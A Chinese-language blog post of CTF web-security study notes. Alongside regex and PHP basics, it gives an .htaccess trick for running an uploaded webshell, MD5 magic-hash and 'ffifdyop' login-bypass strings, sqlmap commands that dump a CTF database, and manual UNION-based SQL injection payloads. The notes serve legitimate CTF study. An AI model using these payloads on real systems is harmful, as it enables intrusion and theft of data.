---
title: ctf web笔记
date: 2020-04-07 09:05:05
updated: 2020-04-08 09:05:05
categories: web
---

ctf-web学习笔记（2020.4.7）

<!--more-->

# 域名解析

   `C:\Windows\System32\drivers\etc`

------

# 文件包含漏洞利用

   <a href="https://www.freebuf.com/articles/web/182280.htm" target="_blank">Web安全实战系列：文件包含漏洞 </a>

------

# 正则表达式

 [正则表达式]( https://deerchao.cn/tutorials/regex/regex-1.htm )

| 代码语法 |            说明            |
| :------: | :------------------------: |
|    .     | 匹配除换行符以外的任意字符 |
|    \w    |       匹配字母或数字       |
|    \s    |      匹配任意的空白符      |
|    \d    |          匹配数字          |
|    \b    |    匹配单词的开始或结束    |
|    ^     |      匹配字符串的开始      |
|    $     |      匹配字符串的结束      |

------

# 拼图

```
    montage *.jpg -tile MxN -geometry axb+0+0 out.jpg    (合成一张大图)

    将目录中的jpg文件按顺序拼成x轴M块，y轴N块，每个图块大小为axb像素，输出文件为out.jpg    
```

```
    gaps --image=out.jpg --generations=50 --population=120 --size=50   （拼图）
    
    --image            指向拼图的路径
    --size            拼图块的像素尺寸
    --generations    遗传算法的代的数量
    --population    个体数量
    --verbose        每一代训练结束后展示最佳结果
    --save            将拼图还原为图像
```

------

# PHP中的全局变量global和$GLOBALS的区别

- globle
  ​    Global的作用是定义全局变量,但是这个全局变量不是应用于整个网站,而是应用于当前页面,包括include       或require的所有文件。
- $GLOBALS
     　在 $GLOBALS 数组中，每一个变量为一个元素，键名对应变量名，值对应变量的内容。$GLOBALS 之所以在全局范围内存在，是因为 $GLOBALS 是一个超全局变量。注意$GLOBALS 的写法，比如变量$a1,写法为$GLOBALS['a1']。
     　$GLOBALS [一个包含了全部变量的全局组合数组]

```
function test_global() 
{ 
global $var1, $var2; 
$var2 =& $var1; 
} 
function test_globals() 
{ 
$GLOBALS['var3'] =& $GLOBALS['var1']; 
} 
$var1 = 5; 
$var2 = $var3 = 0; 

test_global(); 
print $var2; //输出结果为0

test_globals(); 
print $var3; //输结果为05
```

------



# file_get_contents($fn)

file_get_contents功能是从文件名为“$fn”的文件中读取数据，但是当$fn的值为“php://input”，它会接受并返回post的值

------

# htaccess文件解析

如果Apache中.htaccess可被执行并可被上传，那么可以尝试在.htaccess中写入：

```
<FilesMatch "shell.jpg">
SetHandler application/x-httpd-php
</FilesMatch>
```

然后再上传shell.jpg的木马，这样shell.jpg就可被解析为PHP文件了。



# Disearch

```
               python D:\file\dirsearch\dirsearch.py -u http://148.70.62.239:10091/ -e *
```

------

# MD5漏洞

```
1. 如果两个字符经MD5加密后的值为 0exxxxx形式，就会被认为是科学计数法，且表示的是0*10的xxxx次方，还是零，都是相等的。

下列的字符串的MD5值都是0e开头的：
QNKCDZO
240610708
s878926199a
s155964671a
s214587387a
s214587387a


2. md5()函数无法处理数组，如果传入的为数组，会返回NULL，所以两个数组经过加密后得到的都是NULL,也就是相等的。
```

# SQL注入

## md5($password,true)

```
sql注入中 该函数的输出是原始二进制格式，会被作为字符串处理。因此我们希望构建一个字符串，这个字符串经过md5加密后输出的原始二进制（作为字符串处理）刚好是注入语句。
要让md5($password,true) 编码后 二进制转字符串为  'or 'xxx
这样sql 为    and password=''or'xx'   ''or'xx'=true    这样查询结果为真
生成md5('key',true)二进制序列化为'or'开头的有：
e58  
ffifdyop  
129581926211651571912466741651878684928
```

# sqlmap

### POST型

```
1. python /usr/share/sqlmap/sqlmap.py -r 1.txt -p id --current-db
2. python /usr/share/sqlmap/sqlmap.py -r 1.txt -p id -D skctf_flag
3. python /usr/share/sqlmap/sqlmap.py -r 1.txt -p id -D skctf_flag --tables
4. python /usr/share/sqlmap/sqlmap.py -r 1.txt -p id -D skctf_flag -T fl4g --columns
5. python /usr/share/sqlmap/sqlmap.py -r 1.txt -p id -D skctf_flag -T fl4g -C "skctf_flag" --dump
```

```
sql手动注入
第一步：判断环境，寻找注入点
  确定注入点：用’报错就有注入的希望 and 1=1 正常 and 1=2 报错就基本能注入
第二步：猜解字段
  ' order by 3 # 
第三步：联合查询
  0' union select 1,2,3,4#
第四步：爆表
    0' union select 1,database(),user(),version()#
  
   [查表名] id=0' union select 1,(select group_concat(table_name) from information_schema.tables wheretable_schema=database()),user(),version()#           
  
   [查列名]id=0' union select 1,(select group_concat(column_name) from information_schema.columns where table_schema=database()and table_name='表名‘),user(),version()#           
  
   [查数据]id=0' union select 1，(select 列名 from 表名),user(),version()#         
```

